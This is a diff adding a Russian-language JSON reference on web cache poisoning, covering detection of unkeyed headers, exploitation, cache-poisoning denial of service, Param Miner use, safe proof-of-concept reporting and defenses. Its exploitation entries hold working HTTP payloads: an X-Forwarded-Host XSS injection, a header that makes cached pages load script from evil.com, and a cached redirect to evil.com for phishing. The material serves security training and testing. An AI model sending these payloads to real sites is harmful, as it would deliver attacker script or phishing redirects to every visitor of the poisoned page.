@@ -1,0 +1,97 @@
+{
+  "category": "Web Cache Poisoning",
+  "source": "PortSwigger Web Security Academy + PayloadsAllTheThings",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое Web Cache Poisoning",
+      "language": "text",
+      "tags": ["methodology", "cache-poisoning"],
+      "body": "Web Cache Poisoning — атака, при которой злоумышленник заставляет кэш (CDN, reverse-proxy, кэширующий слой) сохранить ВРЕДОНОСНЫЙ ответ и затем отдавать его другим пользователям. В отличие от Web Cache Deception (там жертве подсовывают её же приватный кэшированный ответ), здесь атакующий травит ОБЩИЙ кэш, и payload получают все, кто попал на закэшированную запись.\n\nИмпакт: массовый stored XSS, подмена импортируемых ресурсов, навязанный редирект, отказ в обслуживании (CPDoS) — на всех посетителей."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Cache key и unkeyed inputs",
+      "language": "text",
+      "tags": ["methodology", "cache-key", "unkeyed"],
+      "body": "Кэш хранит ответ под ключом (cache key) — обычно метод + хост + путь + (иногда) часть параметров. Запросы с одинаковым ключом получают один кэшированный ответ.\n\nUnkeyed input — часть запроса, которая ВЛИЯЕТ на ответ, но НЕ входит в ключ (напр. заголовок X-Forwarded-Host). Если такой вход отражается в ответе, атакующий шлёт запрос с вредоносным unkeyed-входом, ответ кэшируется под обычным ключом и отдаётся жертвам.\n\nСуть поиска: найти unkeyed-вход, влияющий на ответ."
+    },
+    {
+      "subcategory": "Детект",
+      "title": "Анализ поведения кэша",
+      "language": "http",
+      "tags": ["detection", "cache-headers"],
+      "body": "Смотри заголовки ответа на признаки кэша:\n\n    X-Cache: hit / miss        (Varnish и др.)\n    Age: 124                   (сколько ответ уже в кэше)\n    CF-Cache-Status: HIT       (Cloudflare)\n    Cache-Control: public, max-age=...\n\nДобавляй cache-buster (уникальный безвредный параметр), чтобы не травить реальный кэш при тестах:\n\n    GET /?cb=12345 HTTP/1.1\n\nПовтори запрос: X-Cache: miss, затем hit подтверждает кэширование."
+    },
+    {
+      "subcategory": "Детект",
+      "title": "keyed vs unkeyed — алгоритм",
+      "language": "text",
+      "tags": ["detection", "unkeyed"],
+      "body": "1. Добавь cache-buster (свой параметр), чтобы работать в изолированной ячейке кэша.\n2. Поочерёдно добавляй подозрительные заголовки (X-Forwarded-Host, X-Host и т.д.) с уникальным значением-канарейкой.\n3. Смотри, отразилось ли значение в ответе (тело / заголовки / Location).\n4. Убери канарейку, повтори: если значение всё равно вернулось из кэша — вход unkeyed и кэшируется, значит уязвимо.\n\nPortSwigger Param Miner автоматизирует подбор таких заголовков и параметров."
+    },
+    {
+      "subcategory": "Unkeyed-входы",
+      "title": "Заголовки-кандидаты",
+      "language": "http",
+      "tags": ["unkeyed", "headers"],
+      "body": "Часто unkeyed и отражаются в ответе:\n\n    X-Forwarded-Host\n    X-Forwarded-Scheme / X-Forwarded-Proto\n    X-Host\n    X-Forwarded-Server\n    X-Original-URL / X-Rewrite-URL\n    Forwarded\n\nПример пробы (с cache-buster):\n\n    GET /?cb=1 HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: canary123.com\n\nЕсли в ответе появляется canary123.com (в ссылке/скрипте/Location) — кандидат на отравление."
+    },
+    {
+      "subcategory": "Эксплуатация",
+      "title": "XSS через unkeyed-заголовок",
+      "language": "http",
+      "tags": ["exploit", "xss"],
+      "body": "Если X-Forwarded-Host отражается в HTML без экранирования:\n\n    GET / HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: a\"><script>alert(document.domain)</script>\n\nОтвет кэшируется и отдаётся жертвам со встроенным скриптом — это stored XSS масштаба «все, кто получил кэш». Тренируйся с cache-buster, чтобы не задеть реальных пользователей."
+    },
+    {
+      "subcategory": "Эксплуатация",
+      "title": "Подмена импортируемого ресурса",
+      "language": "http",
+      "tags": ["exploit", "resource-import"],
+      "body": "Если unkeyed-заголовок задаёт хост для подгружаемого ресурса (скрипт/CSS):\n\n    GET / HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: evil.com\n\n    ...в ответе: <script src=//evil.com/main.js></script>\n\nАтакующий хостит evil.com/main.js, и его JS выполняется у всех жертв закэшированной страницы."
+    },
+    {
+      "subcategory": "Эксплуатация",
+      "title": "Кэшированный open redirect",
+      "language": "http",
+      "tags": ["exploit", "open-redirect"],
+      "body": "Если редирект строится на основе unkeyed-входа, отравленный 301/302 кэшируется:\n\n    GET /login HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: evil.com\n\n    HTTP/1.1 302 Found\n    Location: https://evil.com/login\n\nВсе, кто заходят на /login, редиректятся на evil.com — фишинг и кража токенов."
+    },
+    {
+      "subcategory": "CPDoS",
+      "title": "Cache Poisoning DoS",
+      "language": "text",
+      "tags": ["cpdos", "dos"],
+      "body": "CPDoS — отравление кэша ОШИБОЧНЫМ ответом, чтобы легитимные пользователи получали ошибку:\n• HHO (HTTP Header Oversize): слишком большой заголовок, бэкенд отдаёт 400, ошибка кэшируется.\n• HMC (HTTP Meta Character): спецсимвол в заголовке ломает ответ, кэшируется.\n• HMO (HTTP Method Override): X-HTTP-Method-Override и подобные ломают ответ.\n\nРезультат: на популярной странице в кэше лежит 400/404 — DoS для всех посетителей."
+    },
+    {
+      "subcategory": "Продвинутое",
+      "title": "Fat GET и parameter cloaking",
+      "language": "http",
+      "tags": ["advanced", "fat-get", "cloaking"],
+      "body": "Fat GET — тело у GET-запроса, влияющее на ответ, но не входящее в ключ:\n\n    GET /?param=x HTTP/1.1\n    Host: target.com\n\n    param=evil\n\nParameter cloaking — параметр, который кэш и бэкенд парсят по-разному (разделители ; и &), что позволяет протащить unkeyed-значение. Также изучай нормализацию ключа: регистр, URL-кодирование, дублирующиеся параметры."
+    },
+    {
+      "subcategory": "Инструменты",
+      "title": "Burp Param Miner",
+      "language": "text",
+      "tags": ["tools", "param-miner", "burp"],
+      "body": "Рабочий процесс с Param Miner (расширение Burp):\n1. Правый клик по запросу -> Guess headers / Guess GET parameters.\n2. Включи Add static/dynamic cachebuster — Param Miner сам ставит cache-buster.\n3. Расширение перебирает словарь заголовков/параметров и ищет те, что влияют на ответ (потенциально unkeyed).\n4. Найденный вход проверь вручную на отражение и кэширование (X-Cache).\n\nСм. также раздел Web cache poisoning в методичках PortSwigger."
+    },
+    {
+      "subcategory": "PoC и репорт",
+      "title": "Подтверждение и отчёт",
+      "language": "text",
+      "tags": ["poc", "reporting"],
+      "body": "Безопасный PoC: используй cache-buster (уникальный параметр), чтобы payload попал в ОТДЕЛЬНУЮ ячейку кэша, а не на реальную страницу. Покажи: запрос с unkeyed-входом -> ответ с payload -> повторный запрос БЕЗ payload возвращает закэшированный отравленный ответ (X-Cache: hit).\n\nВ отчёте: уязвимый URL, unkeyed-вход, тип импакта (XSS / redirect / CPDoS), доказательство кэширования и пометка, что продовый кэш НЕ травился."
+    },
+    {
+      "subcategory": "Защита",
+      "title": "Защита",
+      "language": "text",
+      "tags": ["defense"],
+      "body": "• Включай влияющие заголовки в cache key (Vary) либо не отражай их в ответе.\n• Не доверяй X-Forwarded-* без валидации; нормализуй на edge.\n• Отключи кэширование для ответов, зависящих от заголовков вне ключа.\n• Ограничивай размер заголовков на CDN до бэкенда (против HHO CPDoS).\n• Согласуй парсинг параметров между кэшем и приложением (против cloaking)."
+    }
+  ]
+}
